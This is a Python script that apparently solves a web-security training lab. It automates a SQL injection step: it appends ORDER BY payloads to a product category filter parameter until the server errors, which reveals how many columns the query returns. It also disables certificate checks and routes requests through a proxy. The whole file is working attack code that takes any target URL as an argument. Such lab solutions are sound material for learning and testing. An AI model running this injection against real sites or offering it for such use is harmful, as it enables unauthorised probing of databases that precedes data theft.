# Lab: SQLi UNION attack, determining the number of columns returned by the query
import os
import sys

import requests
import urllib3
from dotenv import load_dotenv

load_dotenv()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': "http://" + os.getenv("PROXY_IP") + ":" + os.getenv("PROXY_PORT"),
    'https': "https://" + os.getenv("PROXY_IP") + ":" + os.getenv("PROXY_PORT")
}


def get_num_cols(url):
    category_path = "/filter?category=Gifts"
    for i in range(1, 50):
        sql_payload = f"'+ORDER+by+{i}--"
        r = requests.get(url + category_path + sql_payload, verify=False, proxies=proxies)
        if r.status_code == 500:
            return i - 1
        i = i+1
    return False


def main():
    if len(sys.argv) != 2:
        print("(-> Usage: %s <url>" % sys.argv[0])
        print("(-> Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]

    num_cols = get_num_cols(url)
    if num_cols:
        print("(-> Number of columns: " + str(num_cols))
    else:
        print("(-) Couldn't get the number of columns")


if __name__ == "__main__":
    main()
